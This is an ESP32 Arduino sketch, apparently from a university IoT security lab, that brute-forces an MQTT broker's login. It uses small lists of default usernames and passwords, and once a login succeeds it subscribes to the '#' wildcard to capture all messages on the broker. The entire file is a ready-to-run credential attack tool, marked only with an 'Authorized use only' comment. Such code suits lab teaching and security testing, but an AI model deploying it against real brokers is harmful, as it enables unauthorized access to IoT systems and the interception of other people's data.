/*
 * ESP32 MQTT Credential Brute Forcer
 * Category: Network Attacks
 *
 * Dictionary attack against an MQTT broker. On a successful
 * login, subscribes to '#' wildcard to intercept ALL messages
 * on the broker. Edit MQTT_HOST and credentials lists.
 *
 * Board  : ESP32 DevKit V1
 * Library: WiFi.h (built-in), PubSubClient (Library Manager)
 * KLS GIT Belagavi — IoT Security Lab | Authorized use only.
 */
#include <WiFi.h>
#include <PubSubClient.h>

#define WIFI_SSID  "YourWiFi"
#define WIFI_PASS  "YourPassword"
#define MQTT_HOST  "192.168.1.100"
#define MQTT_PORT  1883

const char* U[]={"admin","user","root","mqtt","guest","operator",""};
const char* P[]={"admin","password","123456","mqtt","root","1234","guest",""};
const int UL=7, PL=8;

WiFiClient net; PubSubClient mqtt(net); bool found=false;

void onMsg(char* t,byte* m,unsigned int l){
  Serial.printf("[MSG] [%s]: ",t);
  for(unsigned i=0;i<l;i++) Serial.print((char)m[i]);
  Serial.println();
}

bool tryLogin(const char* u,const char* p){
  String id="esp_"+String(random(0xFFFF),HEX);
  return mqtt.connect(id.c_str(),*u?u:NULL,*p?p:NULL);
}

void setup(){
  Serial.begin(115200);
  WiFi.begin(WIFI_SSID,WIFI_PASS);
  while(WiFi.status()!=WL_CONNECTED){delay(500);Serial.print(".");}
  Serial.printf("\n[*] MQTT BruteForce -> %s:%d\n\n",MQTT_HOST,MQTT_PORT);
  mqtt.setServer(MQTT_HOST,MQTT_PORT); mqtt.setCallback(onMsg);
  for(int u=0;u<UL&&!found;u++){
    for(int p=0;p<PL&&!found;p++){
      Serial.printf("[*] [%s]:[%s] ... ",U[u],P[p]);
      if(tryLogin(U[u],P[p])){
        Serial.println("SUCCESS!");
        mqtt.subscribe("#");
        Serial.printf("[+] Subscribed '#' as [%s]:[%s]\n",U[u],P[p]);
        found=true;
      } else {
        Serial.printf("fail (rc=%d)\n",mqtt.state());
        mqtt.disconnect(); delay(300);
      }
    }
  }
  if(!found) Serial.println("[-] No credentials found.");
}
void loop(){ if(found&&mqtt.connected()) mqtt.loop(); }
